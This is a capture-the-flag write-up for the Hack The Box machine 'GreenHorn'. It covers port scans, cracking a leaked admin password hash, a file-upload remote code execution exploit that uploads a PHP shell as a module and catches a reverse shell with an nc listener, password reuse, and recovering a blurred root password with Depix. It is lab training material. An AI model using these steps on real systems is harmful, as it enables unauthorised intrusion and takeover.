
## Enumeration
- Let run rustscan with nmap 
```bash
rustscan -a greenhorn.htb
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I don't always scan ports, but when I do, I prefer RustScan.

[~] The config file is expected to be at "/home/malisio/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.25:22
Open 10.10.11.25:80
Open 10.10.11.25:3000
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-20 11:10 +01
Initiating Ping Scan at 11:10
Scanning 10.10.11.25 [2 ports]
Completed Ping Scan at 11:10, 0.07s elapsed (1 total hosts)
Initiating Connect Scan at 11:10
Scanning greenhorn.htb (10.10.11.25) [3 ports]
Discovered open port 80/tcp on 10.10.11.25
Discovered open port 22/tcp on 10.10.11.25
Discovered open port 3000/tcp on 10.10.11.25
Completed Connect Scan at 11:10, 0.22s elapsed (3 total ports)
Nmap scan report for greenhorn.htb (10.10.11.25)
Host is up, received syn-ack (0.11s latency).
Scanned at 2024-09-20 11:10:49 +01 for 1s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds

❯ nmap -sV -sC -p 3000 80 greenhorn.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-20 11:11 +01
Stats: 0:00:08 elapsed; 1 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for greenhorn.htb (10.10.11.25)
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Golang net/http server
|_http-title: GreenHorn
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=f7d9010fe7e7e0c8; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=35r03BvSswaSpsUewBc0I0I5RhE6MTcyNjgyNzA5OTIzOTYxMDcxOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 20 Sep 2024 10:11:39 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=1d0573bc87644fe0; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=PFN7_g5auQzrypzterJGC15wWes6MTcyNjgyNzEwMDIyNDc0OTg0MQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 20 Sep 2024 10:11:40 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=9/20%Time=66ED4A5A%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,252E,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:f7d9010fe7e7e0c8;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=35r03BvSswaSpsUewBc0I0I5RhE6MTcyNjgyNzA5OTIzOTYxMDcxOQ;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2020\x20Sep\x202024\x2010:11:39\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-
SF:auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device
SF:-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x20r
SF:el=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR3Jl
SF:ZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9
SF:ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm
SF:4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJza
SF:XplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX")
SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowe
SF:d\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-
SF:Cookie:\x20i_like_gitea=1d0573bc87644fe0;\x20Path=/;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nSet-Cookie:\x20_csrf=PFN7_g5auQzrypzterJGC15wWes6MTcyNjgy
SF:NzEwMDIyNDc0OTg0MQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSi
SF:te=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2020\x20Sep\
SF:x202024\x2010:11:40\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (1 host up) scanned in 39.81 seconds
```

Navigating to the web server running on port 80 we get this 
![[web-server.png]]
- Let take a look at the admin page 
![[admin.png]]
hmmm let do some enumeration on port 3000 
Looking at port 3000 we can see that it is running a self hosted git hub repository taking a look at the repository that is running on port 80 we can see there is a file called pass.php we can see that it contains  a password for the admin page 
`d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'` and cracking it will give us this password `iloveyou1`.
## Exploitation 

![[repo_hash.png]]
To get a foothold we will use the [CVE](https://vulners.com/packetstorm/PACKETSTORM:173640)  a file upload chained with RCE.
Preparing the payload:

```bash
[malisio@th3g3ntt1m3n exp]$: zip shell.zip shell.php
```
Go to options -> manage modules and upload it, it would be in 
```txt
http://greenhorn.htb/data/modules/shell/shell.php
```
Start a listener and u will get a reverse shell: 
```sh
rlwrap -cAr nc -lvnp 9999
```
## Prev esc 
- The user that runs the server (junior) also uses the same password for his account so we can switch to his user.
```sh
www-data@greenhorn:/$ su junior
Password: iloveyou1
junior@greenhorn:~$ id
uid=1000(junior) gid=1000(junior) groups=1000(junior)
junior@greenhorn:~$ wc -c user.txt
33 user.txt
junior@greenhorn:~$ 
junior@greenhorn:~$ls
'Using OpenVAS.pdf' user.txt
```
- Getting root
Let take a look at the pdf 

![[pdf_overview.png]]
Only if we can unblur the password right? Guess what we can do it using this [tool](clone https://github.com/spipm/Depix)
convert the pdf file to an image
```sh
python3 depix.py -p org_file.jpg -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
```
and with the unblurred img u can ssh into root
```sh
ssh root@greenhorn.htb
root@greenhorn.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Sep 20 03:34:42 PM UTC 2024
root@greenhorn:~# ls
<other_files>  root.txt
root@greenhorn:~# wc -c root.txt 
33 root.txt
```
